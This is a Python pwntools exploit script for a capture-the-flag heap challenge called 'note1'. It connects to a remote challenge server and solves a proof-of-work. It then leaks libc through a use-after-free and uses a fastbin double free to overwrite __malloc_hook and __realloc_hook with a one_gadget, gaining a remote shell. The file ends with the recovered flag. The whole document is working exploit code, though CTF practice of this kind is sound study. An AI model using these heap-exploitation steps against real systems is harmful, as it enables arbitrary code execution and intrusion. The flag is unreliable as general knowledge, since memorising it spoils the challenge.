#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./note1')
libc = ELF('libc-2.23.so')
p = remote('chuj.top', '52712')
# p = process('./note1')

def create(index, size, content):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('index?\n')
    p.recvuntil('>> ')
    p.sendline(str(index))
    p.recvuntil('size?\n')
    p.recvuntil('>> ')
    p.sendline(str(size))
    p.recvuntil('content?\n')
    p.recvuntil('>> ')
    p.sendline(content)

# def edit(index, content):
#     p.recvuntil('>> ')
#     p.sendline('2')
#     p.recvuntil('index?\n')
#     p.recvuntil('>> ')
#     p.sendline(str(index))
#     p.sendline(content)

def show(index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('index?\n')
    p.recvuntil('>> ')
    p.sendline(str(index))

def delete(index):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('index?\n')
    p.recvuntil('>> ')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

from pwnlib.util.iters import mbruteforce
import itertools
import base64

p.recvuntil(') == ')
hash_code = p.recvuntil('\n', drop=True).decode().strip()
log.success('hash_code={},'.format(hash_code))

charset = string.printable
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')

p.sendlineafter('????> ', proof)

# create(0,0x10,'123')
# create(1,0x20,'456')
create(0,0x80,'123')
create(1,0x80,'456')

one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]
delete(0)
show(0)
unsorted_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('unsorted_addr: ' + hex(unsorted_addr))
libc.address = unsorted_addr - 0x3c4b78
log.success('libc.address: ' + hex(libc.address))
one_addr = libc.address + one_gadget[1]
log.success('one_addr: ' + hex(one_addr))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))

create(2,0x60,'123')
create(3,0x60,'456')
create(4,0x60,'789')

delete(2)
delete(3)
delete(2)

realloc_addr = libc.sym["realloc"]

__malloc_hook_s23h = libc.address + 0x3c4b10-0x23
log.success('__malloc_hook_s23h: ' + hex(__malloc_hook_s23h))

__malloc_hook = libc.address + 0x3c4b10
log.success('__malloc_hook: ' + hex(__malloc_hook))

__realloc_hook = libc.address + 0x3c4b10 - 0x8
log.success('__realloc_hook: ' + hex(__realloc_hook))

create(2,0x60,p64(__malloc_hook_s23h))


create(4,0x60,'123')

create(5,0x60,'456')
# payload = b'a'*0x0b + p64(one_addr) + p64(realloc_addr+0x2) # realloc_hook 改成 one_addr， malloc_hook 改成 realloc_addr+0x2，realloc 之后就会 执行realloc_hook
payload = b'a'*0x0b + p64(one_addr) + p64(realloc_addr)
# payload = b'a'*0x13 + p64(one_addr)

create(6,0x60,payload)

# debug()
p.recvuntil('>> ')
p.sendline('1')
p.recvuntil('index?\n')
p.recvuntil('>> ')
p.sendline(str(7))
p.recvuntil('size?\n')
p.recvuntil('>> ')
p.sendline(str(0x10))


p.interactive()
# hgame{A5DugHI2895213g5213S@789DyG923h4TI749HT1498314T}